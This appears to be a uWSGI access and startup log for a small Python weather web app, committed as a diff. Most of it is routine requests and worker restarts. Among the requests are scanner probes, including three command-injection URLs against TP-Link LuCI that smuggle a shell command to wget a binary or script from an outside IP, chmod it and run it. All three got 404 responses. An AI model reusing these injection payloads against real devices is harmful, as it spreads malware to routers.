+{address space usage: 155578368 bytes/148MB} {rss usage: 27947008 bytes/26MB} [pid: 827|app: 0|req: 1/1] 172.104.11.46 () {34 vars in 507 bytes} [Thu Apr  4 19:11:48 2024] GET / => generated 574 bytes in 50 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28016640 bytes/26MB} [pid: 827|app: 0|req: 2/2] 83.97.73.245 () {34 vars in 562 bytes} [Thu Apr  4 19:13:21 2024] GET /actuator/gateway/routes => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27983872 bytes/26MB} [pid: 828|app: 0|req: 1/3] 46.10.204.54 () {44 vars in 798 bytes} [Thu Apr  4 19:16:25 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28905472 bytes/27MB} [pid: 828|app: 0|req: 2/4] 46.10.204.54 () {44 vars in 728 bytes} [Thu Apr  4 19:16:25 2024] GET /static/styles/style.css => generated 359 bytes in 78 msecs via sendfile() (HTTP/1.1 200) 7 headers in 278 bytes (0 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27119616 bytes/25MB} [pid: 832|app: 0|req: 1/5] 46.10.204.54 () {40 vars in 688 bytes} [Thu Apr  4 19:16:26 2024] GET /favicon.ico => generated 207 bytes in 8 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28987392 bytes/27MB} [pid: 832|app: 0|req: 2/6] 46.10.204.54 () {42 vars in 809 bytes} [Thu Apr  4 19:16:35 2024] GET /weather?city=melnik => generated 1102 bytes in 229 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28307456 bytes/26MB} [pid: 830|app: 0|req: 1/7] 46.10.204.54 () {44 vars in 796 bytes} [Thu Apr  4 19:16:35 2024] GET /static/styles/style.css => generated 0 bytes in 39 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156897280 bytes/149MB} {rss usage: 28909568 bytes/27MB} [pid: 835|app: 0|req: 1/8] 46.10.204.54 () {42 vars in 816 bytes} [Thu Apr  4 19:16:54 2024] GET /weather?city= => generated 1123 bytes in 222 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28307456 bytes/26MB} [pid: 830|app: 0|req: 2/9] 46.10.204.54 () {44 vars in 790 bytes} [Thu Apr  4 19:16:54 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27983872 bytes/26MB} [pid: 833|app: 0|req: 1/10] 45.227.255.7 () {36 vars in 582 bytes} [Thu Apr  4 19:24:02 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156897280 bytes/149MB} {rss usage: 28983296 bytes/27MB} [pid: 835|app: 0|req: 2/11] 45.227.255.7 () {38 vars in 630 bytes} [Thu Apr  4 19:24:02 2024] GET /HNAP1/ => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 27983872 bytes/26MB} [pid: 833|app: 0|req: 2/12] 146.19.24.28 () {28 vars in 330 bytes} [Thu Apr  4 19:59:25 2024] GET / => generated 574 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28016640 bytes/26MB} [pid: 827|app: 0|req: 3/13] 185.224.128.34 () {30 vars in 730 bytes} [Thu Apr  4 20:15:47 2024] GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28950528 bytes/27MB} [pid: 827|app: 0|req: 4/14] 46.10.204.54 () {42 vars in 830 bytes} [Thu Apr  4 20:17:03 2024] GET /weather?city=Pazardzhik => generated 1136 bytes in 176 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28905472 bytes/27MB} [pid: 828|app: 0|req: 3/15] 46.10.204.54 () {44 vars in 800 bytes} [Thu Apr  4 20:17:03 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 29511680 bytes/28MB} [pid: 828|app: 0|req: 4/16] 46.10.204.54 () {42 vars in 832 bytes} [Thu Apr  4 20:17:10 2024] GET /weather?city=melnik => generated 1105 bytes in 174 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156786688 bytes/149MB} {rss usage: 29777920 bytes/28MB} [pid: 832|app: 0|req: 3/17] 46.10.204.54 () {44 vars in 796 bytes} [Thu Apr  4 20:17:10 2024] GET /static/styles/style.css => generated 0 bytes in 38 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156786688 bytes/149MB} {rss usage: 29777920 bytes/28MB} [pid: 832|app: 0|req: 4/18] 212.39.89.174 () {40 vars in 763 bytes} [Thu Apr  4 20:20:41 2024] GET / => generated 574 bytes in 8 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28307456 bytes/26MB} [pid: 830|app: 0|req: 3/19] 212.39.89.174 () {40 vars in 700 bytes} [Thu Apr  4 20:20:41 2024] GET /static/styles/style.css => generated 359 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 7 headers in 278 bytes (0 switches on core 0)
+{address space usage: 156897280 bytes/149MB} {rss usage: 28983296 bytes/27MB} [pid: 835|app: 0|req: 3/20] 212.39.89.174 () {40 vars in 722 bytes} [Thu Apr  4 20:20:41 2024] GET /favicon.ico => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156790784 bytes/149MB} {rss usage: 29519872 bytes/28MB} [pid: 830|app: 0|req: 4/21] 212.39.89.174 () {42 vars in 841 bytes} [Thu Apr  4 20:20:55 2024] GET /weather?city=Sofia => generated 1129 bytes in 162 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156913664 bytes/149MB} {rss usage: 28868608 bytes/27MB} [pid: 833|app: 0|req: 3/22] 212.39.89.174 () {44 vars in 829 bytes} [Thu Apr  4 20:20:55 2024] GET /static/styles/style.css => generated 0 bytes in 32 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156897280 bytes/149MB} {rss usage: 28983296 bytes/27MB} [pid: 835|app: 0|req: 4/23] 212.39.89.174 () {42 vars in 867 bytes} [Thu Apr  4 20:21:19 2024] GET /weather?city=Pazardzik => generated 659 bytes in 174 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 156913664 bytes/149MB} {rss usage: 28868608 bytes/27MB} [pid: 833|app: 0|req: 4/24] 212.39.89.174 () {44 vars in 833 bytes} [Thu Apr  4 20:21:19 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156794880 bytes/149MB} {rss usage: 28950528 bytes/27MB} [pid: 827|app: 0|req: 5/25] 212.39.89.174 () {42 vars in 963 bytes} [Thu Apr  4 20:21:30 2024] GET /weather?city=%D0%9F%D0%B0%D0%B7%D0%B0%D1%80%D0%B4%D0%B6%D0%B8%D0%BA+ => generated 659 bytes in 161 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156794880 bytes/149MB} {rss usage: 29437952 bytes/28MB} [pid: 827|app: 0|req: 6/26] 212.39.89.174 () {44 vars in 879 bytes} [Thu Apr  4 20:21:30 2024] GET /static/styles/style.css => generated 0 bytes in 38 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156778496 bytes/149MB} {rss usage: 29511680 bytes/28MB} [pid: 828|app: 0|req: 5/27] 212.39.89.174 () {42 vars in 919 bytes} [Thu Apr  4 20:21:54 2024] GET /weather?city=Pazardzhik => generated 1136 bytes in 103 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+{address space usage: 156778496 bytes/149MB} {rss usage: 29511680 bytes/28MB} [pid: 828|app: 0|req: 6/28] 212.39.89.174 () {44 vars in 834 bytes} [Thu Apr  4 20:21:54 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 20:29:24 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x55586bac28f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x55586bac28f0 pid: 718 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 718)
+spawned uWSGI worker 1 (pid: 830, cores: 2)
+spawned uWSGI worker 2 (pid: 831, cores: 2)
+spawned uWSGI worker 3 (pid: 833, cores: 2)
+spawned uWSGI worker 4 (pid: 834, cores: 2)
+spawned uWSGI worker 5 (pid: 835, cores: 2)
+spawned uWSGI worker 6 (pid: 837, cores: 2)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28020736 bytes/26MB} [pid: 830|app: 0|req: 1/1] 36.134.147.75 () {46 vars in 875 bytes} [Thu Apr  4 20:36:25 2024] GET / => generated 574 bytes in 37 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28020736 bytes/26MB} [pid: 830|app: 0|req: 2/2] 109.205.213.198 () {44 vars in 803 bytes} [Thu Apr  4 20:39:40 2024] GET / => generated 574 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28020736 bytes/26MB} [pid: 831|app: 0|req: 1/3] 46.10.204.54 () {44 vars in 798 bytes} [Thu Apr  4 20:54:02 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156626944 bytes/149MB} {rss usage: 28913664 bytes/27MB} [pid: 831|app: 0|req: 2/4] 46.10.204.54 () {48 vars in 839 bytes} [Thu Apr  4 20:54:02 2024] GET /static/styles/style.css => generated 0 bytes in 32 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156897280 bytes/149MB} {rss usage: 28975104 bytes/27MB} [pid: 833|app: 0|req: 1/5] 46.10.204.54 () {42 vars in 809 bytes} [Thu Apr  4 20:54:07 2024] GET /weather?city=Berlin => generated 1127 bytes in 206 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28405760 bytes/27MB} [pid: 835|app: 0|req: 1/6] 46.10.204.54 () {44 vars in 796 bytes} [Thu Apr  4 20:54:07 2024] GET /static/styles/style.css => generated 0 bytes in 39 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28020736 bytes/26MB} [pid: 837|app: 0|req: 1/7] 146.19.24.28 () {28 vars in 330 bytes} [Thu Apr  4 21:17:26 2024] GET / => generated 574 bytes in 30 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28020736 bytes/26MB} [pid: 834|app: 0|req: 1/8] 43.246.208.201 () {34 vars in 509 bytes} [Thu Apr  4 21:17:39 2024] GET / => generated 574 bytes in 30 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156790784 bytes/149MB} {rss usage: 28479488 bytes/27MB} [pid: 835|app: 0|req: 2/9] 43.246.208.201 () {32 vars in 416 bytes} [Thu Apr  4 21:17:39 2024] GET /favicon.ico => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 155578368 bytes/148MB} {rss usage: 28094464 bytes/26MB} [pid: 837|app: 0|req: 2/10] 43.246.208.201 () {32 vars in 416 bytes} [Thu Apr  4 21:17:39 2024] GET /favicon.ico => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 156897280 bytes/149MB} {rss usage: 29048832 bytes/27MB} [pid: 833|app: 0|req: 2/11] 43.246.208.201 () {32 vars in 416 bytes} [Thu Apr  4 21:17:40 2024] GET /favicon.ico => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 4 buried after 0 seconds
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 21:22:39 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x558b485998f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 583408 bytes (569 KB) for 12 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x558b485998f0 pid: 1577 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1577)
+spawned uWSGI worker 1 (pid: 1578, cores: 2)
+spawned uWSGI worker 2 (pid: 1579, cores: 2)
+spawned uWSGI worker 3 (pid: 1580, cores: 2)
+spawned uWSGI worker 4 (pid: 1582, cores: 2)
+spawned uWSGI worker 5 (pid: 1584, cores: 2)
+spawned uWSGI worker 6 (pid: 1586, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 0 seconds
+worker 2 buried after 0 seconds
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 21:23:41 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x55fbcffde8f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55fbcffde8f0 pid: 1612 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1612)
+spawned uWSGI worker 1 (pid: 1615, cores: 2)
+spawned uWSGI worker 2 (pid: 1616, cores: 2)
+spawned uWSGI worker 3 (pid: 1617, cores: 2)
+spawned uWSGI worker 4 (pid: 1619, cores: 2)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 21:29:51 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x55d52cae28f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55d52cae28f0 pid: 1730 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1730)
+spawned uWSGI worker 1 (pid: 1731, cores: 2)
+spawned uWSGI worker 2 (pid: 1732, cores: 2)
+spawned uWSGI worker 3 (pid: 1733, cores: 2)
+spawned uWSGI worker 4 (pid: 1735, cores: 2)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27942912 bytes/26MB} [pid: 1731|app: 0|req: 1/1] 80.94.92.60 () {44 vars in 799 bytes} [Thu Apr  4 21:54:25 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27942912 bytes/26MB} [pid: 1731|app: 0|req: 2/2] 170.106.171.77 () {46 vars in 872 bytes} [Thu Apr  4 22:06:23 2024] GET / => generated 574 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27942912 bytes/26MB} [pid: 1732|app: 0|req: 1/3] 43.159.129.209 () {46 vars in 872 bytes} [Thu Apr  4 22:19:48 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 155303936 bytes/148MB} {rss usage: 28082176 bytes/26MB} [pid: 1732|app: 0|req: 2/4] 80.94.92.60 () {34 vars in 877 bytes} [Thu Apr  4 22:31:59 2024] GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27201536 bytes/25MB} [pid: 1733|app: 0|req: 1/5] 80.94.92.60 () {34 vars in 877 bytes} [Thu Apr  4 22:31:59 2024] GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) => generated 207 bytes in 8 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27193344 bytes/25MB} [pid: 1735|app: 0|req: 1/6] 83.147.52.37 () {36 vars in 586 bytes} [Thu Apr  4 22:39:53 2024] GET /config/.git/config => generated 207 bytes in 8 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 155303936 bytes/148MB} {rss usage: 28078080 bytes/26MB} [pid: 1733|app: 0|req: 2/7] 93.39.183.13 () {30 vars in 362 bytes} [Thu Apr  4 22:59:11 2024] GET / => generated 574 bytes in 21 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 155303936 bytes/148MB} {rss usage: 28073984 bytes/26MB} [pid: 1735|app: 0|req: 2/8] 120.76.85.232 () {34 vars in 520 bytes} [Thu Apr  4 23:15:20 2024] GET / => generated 574 bytes in 25 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27942912 bytes/26MB} [pid: 1731|app: 0|req: 3/9] 13.48.190.46 () {36 vars in 524 bytes} [Thu Apr  4 23:34:45 2024] GET / => generated 574 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 0 seconds
+worker 3 buried after 0 seconds
+worker 2 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 23:41:14 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x5580114478f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5580114478f0 pid: 2475 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 2475)
+spawned uWSGI worker 1 (pid: 2478, cores: 2)
+spawned uWSGI worker 2 (pid: 2479, cores: 2)
+spawned uWSGI worker 3 (pid: 2480, cores: 2)
+spawned uWSGI worker 4 (pid: 2482, cores: 2)
+{address space usage: 155303936 bytes/148MB} {rss usage: 28020736 bytes/26MB} [pid: 2478|app: 0|req: 1/1] 34.76.158.233 () {42 vars in 583 bytes} [Thu Apr  4 23:42:54 2024] GET / => generated 574 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+SIGINT/SIGTERM received...killing workers...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+[deadlock-detector] a process holding a robust mutex died. recovering...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: unix socket /var/www/weather/weather.sock removed.
+*** Starting uWSGI 2.0.24 (64bit) on [Thu Apr  4 23:47:18 2024] ***
+compiled with version: 11.4.0 on 04 April 2024 12:41:03
+os: Linux-5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+nodename: nodelow
+machine: x86_64
+clock source: unix
+pcre jit enabled
+detected number of CPU cores: 3
+current working directory: /home/dinamitrii/python-check-weather
+detected binary path: /home/dinamitrii/python-check-weather/.venv/bin/uwsgi
+chdir() to /home/dinamitrii/python-check-weather/
+your processes number limit is 22974
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: enabled
+uwsgi socket 0 bound to UNIX address /var/www/weather/weather.sock fd 3
+Python version: 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0]
+Python main interpreter initialized at 0x556fe22df8f0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x556fe22df8f0 pid: 721 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 721)
+spawned uWSGI worker 1 (pid: 834, cores: 2)
+spawned uWSGI worker 2 (pid: 836, cores: 2)
+spawned uWSGI worker 3 (pid: 837, cores: 2)
+spawned uWSGI worker 4 (pid: 839, cores: 2)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27963392 bytes/26MB} [pid: 834|app: 0|req: 1/1] 192.168.1.100 () {44 vars in 799 bytes} [Thu Apr  4 23:49:39 2024] GET / => generated 574 bytes in 46 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156352512 bytes/149MB} {rss usage: 28901376 bytes/27MB} [pid: 834|app: 0|req: 2/2] 192.168.1.100 () {44 vars in 729 bytes} [Thu Apr  4 23:49:39 2024] GET /static/styles/style.css => generated 359 bytes in 71 msecs via sendfile() (HTTP/1.1 200) 7 headers in 278 bytes (0 switches on core 1)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27066368 bytes/25MB} [pid: 836|app: 0|req: 1/3] 192.168.1.100 () {40 vars in 689 bytes} [Thu Apr  4 23:49:41 2024] GET /favicon.ico => generated 207 bytes in 8 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156352512 bytes/149MB} {rss usage: 28823552 bytes/27MB} [pid: 836|app: 0|req: 2/4] 192.168.1.100 () {42 vars in 818 bytes} [Thu Apr  4 23:49:50 2024] GET /weather?city=Pazardzhik => generated 1122 bytes in 493 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156516352 bytes/149MB} {rss usage: 28401664 bytes/27MB} [pid: 839|app: 0|req: 1/5] 192.168.1.100 () {44 vars in 801 bytes} [Thu Apr  4 23:49:50 2024] GET /static/styles/style.css => generated 0 bytes in 40 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 155303936 bytes/148MB} {rss usage: 27963392 bytes/26MB} [pid: 837|app: 0|req: 1/6] 46.10.204.54 () {40 vars in 743 bytes} [Thu Apr  4 23:50:00 2024] GET / => generated 574 bytes in 30 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
